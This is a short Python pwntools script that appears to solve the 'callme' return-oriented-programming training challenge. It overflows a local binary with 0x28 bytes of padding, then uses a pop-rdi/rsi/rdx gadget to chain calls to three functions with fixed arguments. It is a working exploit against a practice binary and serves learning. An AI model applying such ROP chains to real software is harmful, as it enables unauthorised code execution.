from pwn import *

exe = context.binary = ELF('./callme')
p = process('./callme')

offset = 0x28

def push_args(args, payload):
    for i in args:
        payload += p64(i)

    return payload

# rdi, rsi, rdx

pop3ret = 0x0040093c

args = [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d]

callme_one = 0x00400720
callme_two = 0x00400740
callme_three = 0x004006f0

payload = b'A'*offset

payload += p64(pop3ret) # return to pop rdi; pop rsi; pop rdx; ret
payload = push_args(args, payload) # arguments right below the now popped addr, instructions already popped
payload += p64(callme_one) # this gets popped and the registers are loaded with the correct args

# rinse and repeat
payload += p64(pop3ret)
payload = push_args(args, payload)
payload += p64(callme_two)

payload += p64(pop3ret)
payload = push_args(args, payload)
payload += p64(callme_three)

with open("payload.bin", 'wb') as f:
    f.write(payload)

# interactive part
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()
